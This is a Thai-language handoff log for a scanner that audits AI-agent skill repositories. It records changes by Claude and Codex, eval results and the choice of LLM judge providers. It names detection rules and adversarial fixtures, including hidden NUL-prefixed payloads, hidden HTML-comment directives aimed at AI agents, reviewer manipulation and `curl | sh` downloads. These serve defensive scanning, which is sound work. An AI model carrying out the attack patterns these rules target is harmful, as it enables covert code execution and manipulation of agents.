# Handoff — Skill Auditor

เขียนเมื่อ 2026-11-11 ตอนย้ายงานจาก Claude Code ไปทำต่อใน Codex
อ่านไฟล์นี้ให้จบก่อนแก้อะไร ส่วนที่สำคัญที่สุดคือหัวข้อ 6 (กฎที่ห้ามพลาด) และหัวข้อ 8 (งานถัดไป)

---

## อัปเดตโดย Claude (Opus 5.5) เมื่อ 2026-11-12 — เก็บกวาดไฟล์ที่ไม่ใช้

- ลบ `docs/report-preview.html` (แบบร่างหน้ารายงาน ทำเป็นหน้าจริงแล้ว) ถ้าต้องการดูให้ใช้ `git show HEAD~1:docs/report-preview.html` หรือ commit ก่อนหน้านี้
- ลบ `public/file.svg`, `globe.svg`, `next.svg`, `vercel.svg`, `window.svg` (รูปตัวอย่างจาก create-next-app ไม่มีหน้าไหนใช้)
- เพิ่ม `/.agents/` ใน `.gitignore` (โฟลเดอร์ skill ของ Codex เก็บไว้ในเครื่องเท่านั้น) และใน `eslint.config.mjs` (ก่อนหน้านี้ `npm run lint` ล้มเพราะ script `.cjs` ในโฟลเดอร์นั้น)
- ไม่ได้แตะโค้ด ตัวสแกน หรือ `SCANNER_VERSION`

## อัปเดตโดย Codex เมื่อ 2026-11-11 — ปุ่มสแกนหลังย้อนกลับ

แก้ `src/app/repo-form.tsx` ให้ปลดล็อกฟอร์มเมื่อคำขอจบทั้งกรณีสำเร็จและล้มเหลว เพราะ Next.js เก็บสถานะหน้าเดิมไว้เมื่อย้อนกลับจากรายงาน

## อัปเดต 2026-11-11 — แก้ coverage และ NUL

ผู้แก้ไขและเขียนบันทึกส่วนนี้คือ **Codex** เมื่อ 2026-11-11

ตัวสแกนปัจจุบัน 0.3.1 เพิ่ม `ScanResult.coverage` เพื่อบอกผลการตรวจจริงรายไฟล์ งาน `scan-job.ts` รวมข้อมูลนี้กับ coverage จาก GitHub ก่อนบันทึก และส่งให้ AI เฉพาะไฟล์ที่ตัวสแกนไม่ข้าม ใช้คอลัมน์ JSON เดิมได้

เอกสารและสคริปต์ที่มี NUL จะตรวจข้อความต้นฉบับต่อ พร้อม finding `hidden.null-byte` ระดับ medium และ coverage partial ส่วนชนิดไฟล์ที่ตีความไม่ได้หรือมีแต่ NUL กับช่องว่างจะ skipped ถ้าตรวจไม่ได้เลย งานจะ failed พร้อม score null หน้ารายงานเตือนเมื่ออ่านไม่ครบ และเตือนให้สแกนผลรุ่นเก่าใหม่พร้อมซ่อนคะแนนเดิม

ผล rules-only eval อยู่ใน README เพิ่มเคสโจมตี NUL หนึ่งเคส ผลของชุดเดิมเหมือนเดิม การ bump เวอร์ชันทำให้ cache AI รุ่น 0.3.0 ใช้ต่อกับ 0.3.1 ไม่ได้ งาน eval ที่ตั้งเวลาไว้จะใช้โควตาเพื่อประเมินใหม่ตามเวอร์ชันปัจจุบัน

รายละเอียดสถานะและผลวัดด้านล่างเป็นบันทึกเดิมก่อนแก้นี้

### ส่วนที่ Codex เพิ่มหรือแก้ในรอบนี้

| ไฟล์ | ขอบเขตงานของ Codex |
|---|---|
| `src/lib/scanner/index.ts` | ปรับการตรวจไฟล์ที่มี NUL เพิ่มกฎ `hidden.null-byte` ส่ง coverage และเพิ่มเวอร์ชันเป็น 0.3.1 |
| `src/lib/scanner/types.ts` | เพิ่ม `FileCoverage` และ `ScanResult.coverage` |
| `src/lib/scanner/util.ts` | แสดง NUL เป็นเครื่องหมายที่มองเห็นได้ในหลักฐาน |
| `src/lib/scan-job.ts` | รวม coverage จริง จัดการกรณีตรวจไม่ได้ทั้งหมด กรองไฟล์ที่ส่งให้ AI และแปลงอักขระซ่อนก่อนบันทึกข้อความหลักฐาน |
| `src/app/scans/[id]/report.tsx` | แสดงเหตุผลที่ตรวจไม่ได้ คำเตือนตรวจไม่ครบ และคำเตือนรายงานรุ่นเก่าพร้อมซ่อนคะแนน |
| `src/lib/scanner/scanner.test.ts` | เพิ่มเทสต์ NUL และ coverage พร้อมเพิ่ม assertion ในเทสต์ binary เดิม |
| `src/lib/scan-job.test.ts` | เพิ่มไฟล์เทสต์การบันทึกผล coverage และหลักฐานที่มี NUL |
| `src/app/scans/[id]/report.test.tsx` | เพิ่มไฟล์เทสต์ข้อความและคะแนนบนหน้ารายงาน |
| `fixtures/eval/adversarial.json` | เพิ่มเคส `nul-prefixed-payload` |
| `README.md` | อัปเดตผล rules-only eval เป็น 0.3.1 จำนวนเคส และอธิบายผลกระทบ พร้อมระบุเวอร์ชันของผล AI เดิม |
| `docs/HANDOFF.md` | เพิ่มบันทึกอัปเดต 0.3.1 และตารางผู้แก้ไขส่วนนี้ |
| `AGENTS.md` | เพิ่มแนวทางกำกับชื่อผู้แก้ไขตามคำขอเจ้าของโปรเจกต์ |

## อัปเดตโดย Claude (Sonnet 5.5) เมื่อ 2026-11-11 — ปรับหน้ารายงานตามแบบร่าง

ผู้แก้ไขและเขียนบันทึกส่วนนี้คือ **Claude (Sonnet 5.5)** ทำต่อจากงานของ Codex ที่ยังไม่ได้ commit (อ่าน `git diff` แล้ว และไม่ได้ย้อนหรือเขียนทับงานของ Codex) แบบร่างคือ `docs/report-preview.html` ของ Codex (ลบออกแล้วเมื่อ 2026-11-12 ดูได้จากประวัติ git ใน commit ก่อนหน้า)

**สิ่งที่เปลี่ยน:** หน้ารายงานจัดเลย์เอาต์ตามแบบร่าง มือถือเป็นคอลัมน์เดียว เดสก์ท็อป (≥1024px) เป็น 2 คอลัมน์ ตัวเลขทุกจุดมาจากผลสแกนที่เก็บไว้ ไม่ใช่ข้อมูลตัวอย่าง: ระดับความเสี่ยง, จำนวนรายการ, คะแนน และจำนวนไฟล์ อ่านครบ/อ่านบางส่วน/ข้าม ปุ่ม "ตรวจเวอร์ชันล่าสุด" เรียก `POST /api/scans` ตัวเดิม ไม่เพิ่ม API ใหม่ ไม่แตะ schema และไม่ bump `SCANNER_VERSION`

| ไฟล์ | ขอบเขตงานของ Claude |
|---|---|
| `src/app/scans/[id]/report-model.ts` (ใหม่) | ตรรกะล้วนของหน้ารายงาน: type, ข้อความไทย, `summarize()` (ระดับ จำนวน คำเตือน), `isLegacyReport()`, `interpretRecheck()`, `githubLink()` |
| `src/app/scans/[id]/report.tsx` | เขียนเลย์เอาต์ใหม่ตามแบบร่าง (ส่วนหัว+ปุ่ม, การ์ดระดับความเสี่ยง, ขอบเขตการตรวจ, สิ่งที่พบแบบ `<details>`, ไฟล์ที่อ่านบางส่วนหรือข้าม) ข้อความ finding แสดงเป็นข้อความล้วนเหมือนเดิม |
| `src/app/scans/[id]/page.tsx` | ขยายความกว้างเป็น 1120px และใส่ `key={id}` ให้ `Report` เพื่อให้เปิดรายงานใหม่แล้วเริ่มสถานะใหม่ |
| `src/app/scans/[id]/report.test.tsx` | เพิ่ม mock ของ `next/navigation` (จำเป็นเพราะ `Report` ใช้ `useRouter` แล้ว) และเพิ่มเคสทดสอบเลย์เอาต์ ตัวเลขจริง คำเตือน และการแสดงผลแบบข้อความล้วน |
| `src/app/scans/[id]/report-model.test.ts` (ใหม่) | เทสของ `report-model.ts` |

**พฤติกรรมที่ตั้งใจ**
- **ปุ่มตรวจเวอร์ชันล่าสุด:** API คืน id เดิม แปลว่า commit และกฎตรงกับรายงานนี้แล้ว จึงแสดงข้อความว่ายังไม่มีเวอร์ชันใหม่ ถ้าคืน id อื่น (commit ใหม่ กฎรุ่นใหม่ หรือรายงานเดิมล้มเหลว) จะพาไปรายงานใหม่ ปุ่มใช้ได้กับรายงานที่เสร็จแล้วและที่ล้มเหลว ไม่แสดงตอนกำลังสแกน
- **ปุ่มไม่ค้างเมื่อย้อนกลับ:** รีเซ็ตสถานะใน `finally` (แนวทางเดียวกับที่ Codex แก้ใน `repo-form.tsx`) และใช้ `useTransition` กับ `router.push` เพื่อให้สถานะ "กำลังเปิดรายงานใหม่" หายเองเมื่อการนำทางจบ ทดสอบแล้ว: กดปุ่มไปรายงานใหม่ แล้วย้อนกลับ ปุ่มกดได้และไม่มีข้อความค้าง
- **คำเตือนที่คงไว้:** "ตรวจไม่ครบ" (มีรายการอ่านบางส่วนหรือข้าม) และ "รายงานรุ่นเก่า" (ซ่อนคะแนนและบอกให้กดปุ่มตรวจเวอร์ชันล่าสุด) รวมถึง "ข้อมูลไม่เพียงพอสำหรับประเมิน" และข้อความ "ไม่ได้แปลว่าปลอดภัย" เมื่อไม่พบปัญหา
- **ลิสต์ไฟล์ที่ข้ามยาวได้หลายร้อยรายการ** (เช่น `anthropics/skills` ข้าม 241 ไฟล์) จึงโชว์ 8 รายการแรก ส่วนที่เหลือพับไว้ใน "ดูอีก N รายการ" ไม่มีรายการใดถูกตัดทิ้ง

**บั๊กที่พบในงานค้างของ Codex และแก้แล้ว:** `report.tsx` ตัดสินรายงานรุ่นเก่าจากรายการตายตัว `["0.1.0","0.2.0","0.3.0"]` ซึ่งไม่มี `0.2.1` และ `0.2.2` ทั้งที่มีรายงานจากสองรุ่นนี้อยู่ใน database จริง รายงานเหล่านั้นจึงไม่ถูกเตือนและยังโชว์คะแนน ตอนนี้ `isLegacyReport()` เทียบเลขเวอร์ชันกับ `0.3.1` (รุ่นแรกที่เก็บ coverage จริง) จึงครอบคลุมทุกรุ่นเก่าและรุ่นในอนาคตโดยไม่ต้องแก้รายการ

**ที่ยังต้องรู้**
- งานของ Codex และของ Claude ยังไม่ได้ commit ทั้งหมด (ตรวจแล้ว: เทส 188 ข้อ ผ่านหมด, `tsc` และ `npx eslint src scripts` ผ่าน)
- (แก้แล้ว 2026-11-12 ดูหัวข้อด้านบน) `.agents/` ที่ยังไม่ติดตามใน git เป็นโฟลเดอร์ skill ออกแบบของ Codex ขนาดใหญ่ (มี `__pycache__`) **ไม่ควร commit รวมไปกับงานนี้** และทำให้ `npm run lint` (ทั้งโปรเจกต์) ฟ้อง 15 errors จากไฟล์ `.cjs` ข้างใน ต้องเพิ่ม `.agents/**` ใน ignores ของ `eslint.config.mjs` หรือย้ายออกก่อน commit
- หน้ารายงานยังไม่แสดงผลจาก AI (งานถัดไปข้อ 8.1 ในเอกสารนี้) ป้ายคะแนนเขียนว่า "คะแนน" ไม่ใช่ "คะแนนจากกฎ" ตามแบบร่าง เพราะเมื่อเปิด judge คะแนนมาจากกฎรวมกับ AI และฐานข้อมูลยังไม่บันทึกว่า judge ทำงานหรือไม่
- เวลาทดสอบใน Browser pane ของแอป Claude: ถ้าหน้าต่างไม่ได้ถูกวาด (ถูกบัง/ย่อ) หน้ารายงานจะค้างที่ "กำลังโหลด…" เพราะ Next.js ใช้ `requestAnimationFrame` สลับเนื้อหาที่สตรีมมา การถ่ายภาพหน้าจอ 1 ครั้งก่อนตรวจจะทำให้เนื้อหาขึ้นมา เป็นปัญหาของ pane ไม่ใช่ของแอป (ตรวจแล้วว่า server ส่งเนื้อหาครบ)

## อัปเดตโดย Claude (Sonnet 5.5) เมื่อ 2026-11-11 — แบ่งโควตาไฟล์ต่อ skill (งานถัดไปข้อ 8.2)

ผู้แก้ไขและเขียนบันทึกส่วนนี้คือ **Claude (Sonnet 5.5)** ไม่แตะกฎของตัวสแกน จึง**ไม่ได้ bump `SCANNER_VERSION`** และไม่กระทบ cache ผล AI ของ eval ที่ตั้งเวลาไว้

| ไฟล์ | ขอบเขตงานของ Claude |
|---|---|
| `src/lib/github.ts` | เขียน `planFiles()` ใหม่ และเพิ่ม `readRank()` ปรับ `LIMITS.maxFiles` จาก 200 เป็น 400 |
| `src/lib/github.test.ts` | เพิ่มเทส 19 ข้อ (10 ข้อเป็นตาราง `readRank`): ลำดับตามชนิดไฟล์, การผลัดกันระหว่าง skill, skill ซ้อนกัน, เคสที่ skill มากกว่าเพดาน, งบขนาดรวม, ผลลัพธ์คงที่ ตรวจแล้วว่าปิดการผลัดกันแล้วเทสล้มจริง |

**วิธีเลือกไฟล์แบบใหม่:** เพดานยังเป็นของทั้ง repo แต่แบ่งให้ทุก skill ยุติธรรมกัน อ่านตามความสำคัญ (0 = SKILL.md, 1 = โค้ด, 2 = ข้อความ md/txt/html, 3 = ข้อมูลอื่นๆ) และภายในแต่ละระดับให้ skill **ผลัดกัน** คนละไฟล์ ผลคือ SKILL.md และสคริปต์ของทุก skill ถูกอ่านก่อนไฟล์อ้างอิงของ skill ใดๆ ระดับกำหนดจาก**ชนิดไฟล์** ไม่ใช่ชื่อโฟลเดอร์ (เดิมไฟล์ `.xsd` ใน `scripts/office/schemas/` ถูกนับเป็นสคริปต์จึงแย่งโควตา) ไฟล์เป็นของ skill ที่ลึกที่สุดที่ครอบมัน

**ผลวัดบน repo จริง** (จากรายชื่อไฟล์ ที่เพดาน 200 เทียบกับแบบเดิม; "โค้ดครบ" = จำนวน skill ที่ไฟล์โค้ดถูกอ่านครบทุกไฟล์):

| repo | โค้ดครบ แบบเดิม → ใหม่ |
|---|---|
| anthropics/skills | 6/11 → 11/11 |
| vercel-labs/agent-skills | 0/1 → 1/1 |
| trailofbits/skills | 16/24 → 24/24 |
| coreyhaines31/marketingskills | 1/2 → 2/2 |
| alexgreensh/repo-forensics | 2/5 → 4/5 (ที่เหลือติดงบ 5 MB) |

**ทำไมปรับเพดานเป็น 400:** วัดเวลาจริง ค่าคงที่ ~7–8 วินาทีเมื่อ repo ยังไม่เคยถูกขอรายชื่อไฟล์ (เป็นเวลาที่ GitHub สร้างรายชื่อไฟล์ ไม่ขึ้นกับจำนวนไฟล์ที่เราดึง) ส่วนไฟล์เพิ่มทุก 100 ไฟล์ใช้เวลาเพิ่ม ~0.3–0.7 วินาที ที่ 400 ไฟล์ repo อย่าง anthropics/skills (377), vercel-labs (301) และ snyk/agent-scan (226) จะถูกอ่านครบ คำเตือน "ตรวจไม่ครบ" จึงไม่ขึ้นโดยไม่จำเป็น ไม่ควรเกินนี้: งบ 5 MB เป็นตัวจำกัดก่อนอยู่แล้ว (repo-forensics หยุดที่ ~250 ไฟล์) และเพดานรวมต่อ repo ยังกันภาระต่อ GitHub/เว็บของเรา ตัวเลขเวลาวัดจากเครื่องนี้ (ไทยไป GitHub) ยังไม่ได้วัดบน Vercel

**ที่ยังไม่แก้ (รู้แล้ว):** repo แบบ "แค็ตตาล็อก" ที่มี skill หลายร้อยตัว (`mukul975/Anthropic-Cybersecurity-Skills` มี 818 skill, 4,484 ไฟล์) ยังอ่าน SKILL.md ได้แค่ 400 จาก 818 ตัว เพราะ SKILL.md ทุกตัวต้องมาก่อน และ skill ที่ไม่ถูกอ่านเลยจะอยู่ในรายการ "ข้าม" ของรายงานครบทุกไฟล์ (ราว 4,000 รายการใน `coverage` ซึ่งทำให้แถวใน database ใหญ่ ~0.5 MB ต่อการสแกน ควรพิจารณาย่อรายการ coverage ถ้าเจอ repo แบบนี้บ่อย)

**ข้อควรรู้เรื่อง cache:** ผลเก่าของ repo หลาย skill ที่เก็บไว้ยังขึ้นตามเดิมจนกว่าจะมี commit ใหม่หรือ bump `SCANNER_VERSION` เพราะ cache ผูกกับ commit + เวอร์ชันตัวสแกน ไม่ได้ผูกกับ `LIMITS` ถ้าอยากให้รายงานเก่าได้ผลใหม่ ให้ bump ไปพร้อมงานข้อ 8.3

## อัปเดตโดย Claude (Fable 5.2) เมื่อ 2026-11-12 — สำรวจ skill จริง และเปลี่ยนรายงานเป็น "สิ่งที่ skill ทำ"

เจ้าของโปรเจกต์ตัดสินใจเปลี่ยนแนวทางหลังเห็นผลสำรวจ: รายงานเลิกแสดงระดับความเสี่ยงและคะแนน เปลี่ยนเป็นจัดกลุ่มหลักฐานตามสิ่งที่ skill ทำ ตัวเลขและเหตุผลอยู่ใน README หัวข้อ "สำรวจ skill จริง 1,041 ตัว" **ไม่ได้แก้กฎและไม่ได้ขึ้น `SCANNER_VERSION`** ตัวสแกนกับ API ยังคืน `riskLevel` และ `score` เหมือนเดิม

| ไฟล์ | ขอบเขตงานของ Claude |
|---|---|
| `scripts/survey.ts` (ใหม่) | สแกน skill ตัวอย่างจาก repo ใน `.eval-cache/survey/candidates.tsv` ด้วยกฎอย่างเดียว เก็บผลต่อ repo ไว้ให้รันต่อได้ ใช้ `GITHUB_TOKEN` จาก env (ไม่มี token จะติดเพดาน 60 คำขอต่อชั่วโมง) |
| `src/app/scans/[id]/report-model.ts` | เพิ่ม `TOPICS`, `topicOf`, `byTopic` (แมป rule id ไปหัวข้อ 9 หัวข้อ กฎที่ไม่รู้จักตกไป "อื่นๆ") และ `groupBySkill` เรียงตามจำนวนที่พบแทนระดับความรุนแรง `VERDICT`, `RISK_LABEL`, `showScore` ยังอยู่แต่หน้ารายงานไม่ใช้แล้ว |
| `src/app/scans/[id]/report.tsx` | การ์ดบนสุดเป็น "สิ่งที่ skill นี้ทำ" พร้อมจำนวนต่อหัวข้อ ไม่มีคำระดับความเสี่ยง ป้ายสี หรือคะแนน / หลักฐานจัดตาม skill แล้วตามหัวข้อ แต่ละหัวข้อมีหมายเหตุช่วยชั่งน้ำหนัก |
| `src/app/scans/[id]/report.test.tsx` | แก้เทสต์ที่เคยยืนยันคะแนนและระดับ เพิ่มเทสต์ว่าหน้าไม่แสดงคำตัดสิน และเทสต์การแบ่งหัวข้อ |
| `src/app/page.tsx` | ข้อความหน้าแรกและตัวอย่างเปลี่ยนตามแนวทางใหม่ |
| `README.md` | เพิ่มผลสำรวจ และแก้คำอธิบายโปรเจกต์ |

**งานที่ควรทำต่อ (ยังไม่ได้ทำ):** ใช้ผลสำรวจเป็นชุดทดสอบจริงเพื่อแก้กฎที่จับผิดบ่อย (รายการอยู่ใน README), รวม skill ที่คัดลอกซ้ำหลายโฟลเดอร์, และแสดงปลายทางของคำสั่งให้ชัด (เช่น โดเมนที่ `curl | sh` ดาวน์โหลด)

## อัปเดตโดย Claude (Fable 5.2) เมื่อ 2026-11-12 — ปรับหน้ารายงานและหน้าแรก (commit 694737d ขึ้นเว็บจริงแล้ว) และเพิ่ม Vercel Web Analytics

เจ้าของโปรเจกต์เลือกแก้ 4 ข้อจากการรีวิว UI ไม่ได้แตะตัวสแกน กฎ หรือ `SCANNER_VERSION`

| ไฟล์ | ขอบเขตงานของ Claude |
|---|---|
| `src/app/scans/[id]/report-model.ts` | เพิ่ม `groupBySkill` (จัดไฟล์และสิ่งที่พบตามโฟลเดอร์ที่มี `SKILL.md` ไฟล์ที่ไม่อยู่ใน skill ใดรวมเป็นกลุ่ม "ไฟล์นอกโฟลเดอร์ skill") และ `incompleteReasons` (สรุปไฟล์ที่ข้ามตามเหตุผล) |
| `src/app/scans/[id]/report.tsx` | การ์ดระดับความเสี่ยงกับขอบเขตการตรวจรวมเป็นการ์ดเดียว มีบรรทัด "อ่านครบ X จาก Y ไฟล์" และคำอธิบายคะแนน / สิ่งที่พบกินเต็มความกว้างและจัดกลุ่มตาม skill พร้อมรายชื่อกลุ่มที่ไม่พบอะไร / รายชื่อไฟล์ที่ข้ามย่อเป็นสรุปตามเหตุผล รายการเต็มอยู่ใน `<details>` / ลิงก์ในรายงานสูง 44px |
| `src/app/scans/[id]/report.test.tsx` | แก้เทสต์รายการไฟล์ที่ข้ามให้ตรงรูปแบบใหม่ เพิ่มเทสต์ 2 ข้อ (จำนวนไฟล์ข้างระดับความเสี่ยง, การจัดกลุ่มตาม skill) |
| `src/app/page.tsx` | เพิ่มตัวอย่างสิ่งที่รายงานบอก ใช้เคส `hidden-html-comment-directive` จาก `fixtures/eval/risky.json` และระบุว่าเป็น skill สมมติ |
| `src/app/layout.tsx`, `package.json` | เพิ่ม `@vercel/analytics` และ `<Analytics />` เพื่อนับผู้เข้าชมแบบไม่ใช้ cookie เจ้าของโปรเจกต์ต้องกดเปิด Web Analytics ในหน้าโปรเจกต์บน Vercel ก่อนจึงจะมีตัวเลข เหตุผล: ตาราง `scans` นับการใช้งานไม่ได้ เพราะการสแกนซ้ำ commit เดิมใช้แถวเดิม และไม่มีการบันทึกการเปิดหน้า (ณ 2026-11-12 มี 21 แถว ทั้งหมดเกิดวันที่ 11 ช่วงพัฒนา) |
| `.claude/launch.json` (ใหม่) | ให้ Claude เปิด `npm run dev` เพื่อดูผลในเบราว์เซอร์ |

## อัปเดตโดย Claude (Sonnet 5.5) เมื่อ 2026-11-11 — เพิ่ม Gemini เป็น judge ตัวที่สอง

ผู้แก้ไขและเขียนบันทึกส่วนนี้คือ **Claude (Sonnet 5.5)** เจ้าของโปรเจกต์เลือก Gemini เป็นตัวสำรองของ Groq (ตัวเลือกอื่นที่ค้นดูแล้วอยู่ในประวัติแชท: OpenRouter `:free` จำกัด 50 ครั้ง/วัน, Mistral ต้องยอมให้ใช้ข้อมูลฝึกโมเดล, Cerebras เลิกแผนฟรีถาวร)

**สถานะ: ยืนยันกับ API จริงแล้ว (key อยู่ใน `.env.local` ของเครื่องเจ้าของโปรเจกต์) เปิดใช้บนเว็บจริงยังไม่ได้ทำ** รูปคำขอที่ส่ง (ไม่ส่ง `temperature`/max tokens) Google รับได้ ผลทดสอบกับโมเดล `gemini-3.5-flash-lite`: fixture อันตราย → 6 ข้อค้นพบที่ถูกต้อง หลักฐานผ่านการตรวจหมด / fixture ปกติ → ไม่มีข้อค้นพบ และ `purpose_mismatch` เป็น false ใช้เวลา 3–18 วินาทีต่อครั้ง (ส่วนใหญ่ 6–10) ประมาณ 2,300 token เข้า และ 2,000 ออก ขั้นตอนต่อไป: ดูผล `npm run eval -- --judge --provider gemini` เทียบกับ Groq แล้วถ้าคุณภาพไม่ตกกว่า ค่อยตั้ง `JUDGE_PROVIDERS=groq,gemini` และ `GEMINI_API_KEY` ใน Vercel

**บั๊กที่เจอตอนทดสอบกับ Gemini จริง (แก้แล้ว):**
1. **`extractJson` พังเมื่อหลักฐานมี ``` อยู่ข้างใน** (เกิดเมื่อ skill ที่ตรวจมีบล็อกโค้ด ```bash แล้วโมเดลยกมาเป็นหลักฐาน) โค้ดเดิมเห็น ``` ข้างใน string แล้วเข้าใจว่าคำตอบทั้งก้อนถูกห่อด้วย code fence จึงตัดเฉพาะข้างในไปหา JSON ไม่เจอ ("no JSON object in reply") ล้มราว 1 ใน 3 ของการเรียก ตอนนี้ลอง parse ทั้งก้อนก่อน แล้วค่อยถอดจาก fence หรือหาปีกกานอกสุด ไม่เกี่ยวกับผู้ให้บริการ จึงแก้ปัญหาที่ Groq อาจเจอได้ถ้าโมเดลยกบล็อกโค้ดมาเป็นหลักฐาน ไม่กระทบ cache ของ eval (คีย์ผูกกับโมเดล/เวอร์ชัน/ไฟล์ ไม่ผูกกับตัว parse)
2. **Gemini ตอบ 503 UNAVAILABLE ("โมเดลมีคนใช้เยอะ") ชั่วคราว** ราว 1 ใน 5 ของการเรียกที่วัดได้ ตอนนี้ลองใหม่สูงสุด 2 ครั้ง (รอ 1.5 วินาที แล้ว 3 วินาที) ถ้าเวลาไม่พอสำหรับผู้ให้บริการตัวถัดไปในสายสำรอง จะไม่รอ เฉพาะ Gemini ส่วน Groq ยังเหมือนเดิม (503 รายงานทันที)
หลังแก้: เรียกผ่านตัวเชื่อมจริง 16 ครั้ง สำเร็จ 16 ครั้ง

**ผล eval ของ Gemini (Claude, 2026-11-11, `gemini-3.5-flash-lite`, ครบ 120 เคส, ใช้ไป ~120 ครั้งจากโควตา 500 ครั้ง/วัน)** — ยังไม่ได้ใส่ใน README เพราะงานตั้งเวลา (2026-11-12 14:00) จะเขียนทับหัวข้อ Groq ใน README ให้เติมหลังจากนั้น
| | กฎอย่างเดียว | กฎ + Gemini |
|---|---|---|
| จับได้ รวมจุดบอด medium+ / high+ | 71% / 57% | **91% / 86%** |
| เตือนผิด skill จริงทั่วไป medium+ / high+ | 1/49 / 0/49 | 4/49 / 3/49 |
| Precision medium+ / high+ | 89% / 95% | 84% / 86% |
จุดบอด 10 จุด Gemini จับได้ 7 (ไม่ได้: `unpinned-npx`, `hardcoded-key`, `frontmatter-invalid`; Groq จับ `hardcoded-key` ได้) การตรวจหลักฐานทิ้ง finding ของ Gemini 5 รายการ (Groq 1)

**อ่านตัวเลขเตือนผิดอย่างระวัง (ตรวจโค้ดจริงแล้ว):**
- `web-design-guidelines` และ `writing-guidelines` (vercel-labs) ที่ Gemini ยกเป็น high **ไม่ใช่การเตือนผิด** skill สั่งให้ดึงกฎจาก URL ภายนอกทุกครั้งแล้วทำตามเนื้อหานั้น ตรงกับ SUP-04 ในสเปก (ระดับ high ตรวจสอบไม่ได้) ชุดวัดผลตีความ skill กลุ่ม `general` ว่าไม่ควรถูกเตือนเลยจึงนับเป็นเตือนผิด ควรแยกเคส "ดึงคำสั่งจากภายนอก" ออกเป็นหมวดของมันเอง
- **Gemini ไม่นิ่ง และสั่งให้นิ่งไม่ได้:** `pptx` (skill จริง) และ `plain-download` (`curl -fsSL -o data.csv … && wc -l`) ถูกยกเป็น high ใน eval แต่ตรวจซ้ำไม่ถูกเตือน ทดสอบ `plain-download` 8 ครั้ง: ไม่ตั้ง temperature ได้ none_found 4 / high 4 (`llm.remote-code-or-instructions` ความมั่นใจ 1.0) ส่ง `temperature: 0` ก็ได้ผลเท่าเดิม 4/4 (endpoint รับค่าไม่ error แต่ไม่ช่วยให้นิ่ง) จึงยัง**ไม่ส่ง** temperature
- **ข้อสรุปชั่วคราว:** ใช้ Gemini เป็นตัวสำรองได้ แต่ไม่ควรเป็นตัวหลัก ผลของการสแกนหนึ่งครั้งถูก cache ตาม commit จึงไม่เปลี่ยนในรายงานเดิม แต่ผลของ commit ใหม่ของ skill เดิมอาจต่างกันได้ ทางแก้ที่ควรพิจารณา (ยังไม่ได้ทำ): ให้ finding ที่มาจาก LLM ล้วน (ไม่มีกฎยืนยัน) ถูกจำกัดที่ระดับ medium เว้นแต่เป็นหมวดที่สเปกระบุ (เช่น reviewer_manipulation) หรือขอให้ตอบซ้ำแล้วเอาตัวที่เห็นตรงกัน — ต้องวัดด้วย eval ก่อนใช้ และเปรียบเทียบกับผล Groq ฉบับเต็มหลังงาน 14:00 วันที่ 12 พ.ย. ก่อนตัดสินว่าใครเป็นตัวหลัก

| ไฟล์ | ขอบเขตงานของ Claude |
|---|---|
| `src/lib/judge/openai-compat.ts` (ใหม่) | แกนกลางของ judge ที่คุยแบบ OpenAI chat-completions: `OpenAICompatJudge` (ตัวเลือกต่อผู้ให้บริการ: endpoint, โมเดล, `temperature`, พารามิเตอร์จำกัดความยาว, `extraBody`, `serverErrorRetries` สำหรับ 5xx ชั่วคราว), `QuotaError`, `toStrictSchema` ย้ายมาจาก `groq.ts` |
| `src/lib/judge/groq.ts` | เหลือแค่ตัวกำหนดค่าของ Groq บนแกนกลาง **คำขอที่ส่งเหมือนเดิมทุกอย่าง** (temperature 0, `max_completion_tokens` 3000, `reasoning_effort: "low"`, strict schema) ชื่อโมเดลที่บันทึกยังเป็น `groq/openai/gpt-oss-120b` จึงไม่กระทบ cache ผล AI ของ eval |
| `src/lib/judge/gemini.ts` (ใหม่) | `GeminiJudge` ผ่าน `https://generativelanguage.googleapis.com/v1beta/openai/chat/completions` โมเดลเริ่มต้น `gemini-3.5-flash-lite` (รุ่น Flash-Lite ที่ Google ระบุว่า stable แต่เอกสารไม่บอกว่าอยู่ในแผนฟรีหรือไม่) **ตั้งใจไม่ส่ง `temperature` และ max tokens** เพราะเอกสารไม่ระบุว่า endpoint นี้รับหรือไม่ ส่ง `reasoning_effort` ก็ต่อเมื่อตั้ง `GEMINI_REASONING_EFFORT` |
| `src/lib/judge/fallback.ts` (ใหม่) | `FallbackJudge` ลองทีละตัวตามลำดับ ล้มด้วยเหตุใดก็ตาม (โควตา ล่ม timeout) ก็ไปตัวถัดไป ทุกตัวล้มจึงโยน error ล่าสุด (สแกนจะใช้กฎอย่างเดียว) `model` บอกตัวที่ตอบจริง และสร้าง prompt ตามขนาดของตัวที่เล็กที่สุด |
| `src/lib/judge/index.ts` | แก้ `extractJson` ตามบั๊กข้อ 1 ด้านล่าง และเพิ่ม `getJudge({ provider })`: ระบุ `provider` = ตัวนั้นตัวเดียว ไม่มี fallback และไม่ดู `JUDGE_PROVIDERS` / ไม่ระบุ = ตาม `JUDGE_PROVIDERS` (ค่าเริ่มต้น `groq` ตัวเดียว) ข้ามตัวที่ไม่มี key เมื่อมี 2 ตัวขึ้นไป timeout ต่อตัว 22 วินาทีเพื่อให้ตัวที่สองมีเวลา (การสแกนมี 60 วินาที) |
| `scripts/eval.ts` | เพิ่ม `--provider groq\|gemini` (ค่าเริ่มต้น groq) **eval ไม่มีวันใช้ fallback หรือ `JUDGE_PROVIDERS`** เพราะรันที่ปนหลายโมเดลให้ตัวเลขที่ไม่ใช่ของโมเดลไหนเลย ถ้าไม่มี key ของตัวที่ขอ จะหยุดพร้อมข้อความ ไม่สลับไปตัวอื่นเงียบๆ หัวข้อผลบอกชื่อโมเดลที่ใช้ |
| `scripts/judge-smoke.ts` | รับอาร์กิวเมนต์ที่สอง `groq\|gemini` ไว้ทดสอบทีละเจ้า |
| `src/lib/judge/providers.test.ts` (ใหม่) | เทส 28 ข้อ: รูปคำขอของ Groq ต้องไม่เปลี่ยน, Gemini, fallback, ลำดับ provider, `getJudge` กับ env ต่างๆ (ใช้ `vi.stubEnv` ไม่ยิง API จริง) |

**ความปลอดภัยต่อ eval ที่ตั้งเวลาไว้ (2026-11-12 14:00):** ใช้คำสั่ง `eval.ts --judge` ไม่ระบุ provider จึงเป็น Groq ตัวเดียวเหมือนเดิม ไม่ว่าจะมี `GEMINI_API_KEY` หรือ `JUDGE_PROVIDERS` ในเครื่องหรือไม่ และไม่ได้เปลี่ยน `SCANNER_VERSION` หรือ `PROMPT_VERSION`

